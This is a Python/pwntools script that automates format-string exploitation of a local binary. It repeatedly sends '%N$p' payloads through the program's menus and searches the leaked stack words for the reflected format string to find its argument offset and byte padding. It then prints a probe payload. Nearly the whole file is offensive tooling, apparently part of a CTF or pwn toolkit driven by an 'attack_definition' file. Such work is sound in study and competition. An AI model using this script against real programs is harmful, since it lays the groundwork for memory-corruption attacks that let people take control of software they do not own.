import re
import pwn

def run_fmt_str(payload, binary, route, menus, hooks={}):
    binary = pwn.process(binary)

    if 'setup' in hooks: hooks['setup'](binary)

    for item in route:
        rv = menus[item](payload, binary)

    if 'teardown' in hooks: hooks['teardown'](binary)

    binary.close()

    return rv

def find_params(binary, route, menus, hooks={}):
    buf = b''
    pfmt = ''
    for i in range(1, 10000):  # Going over 10000 makes finding reflected %10000$p much harder
        payload = f"a%{i}$p"
        rv = run_fmt_str(payload, binary, route, menus, hooks)
        addr = re.search(r"(0x[0-9a-f]{1,8}|\(nil\))", rv.decode('ascii', 'ignore'))[0]
        if addr == '(nil)':
            buf = b''
            continue

        buf += pwn.pack(int(addr, 16)) 

        # We want to check the last 8 bytes to see if we can find something that looks like a fmt string
        last_2 = buf[-8:]
        if b'$p' in last_2 and b'%' in last_2:
            percent = last_2.index(b'%')
            dp      = last_2.index(b'$p')
            idx     = last_2[percent+1:dp]
            fmt_str = last_2[percent:dp+2]
            if all(i in b'1234567890' for i in idx):
                return (i + (1 if percent >= 4 else 0), (percent+1) % 4)

        pfmt = payload


if __name__ == '__main__':
    import argparse
    import utils

    parser = argparse.ArgumentParser()
    parser.add_argument('attack_definition')
    parser.add_argument('fmt_route')
    argp = parser.parse_args()

    attack_definition = utils.load_attack_definition(argp.attack_definition)
    offset, pad = find_params(attack_definition['binary'], argp.fmt_route.split(','), attack_definition['menus'], attack_definition['hooks'])
    print(f"Offset: {offset}, Pad: {pad}")
    print(f"{'a'*pad}AAAA%{offset}$p")
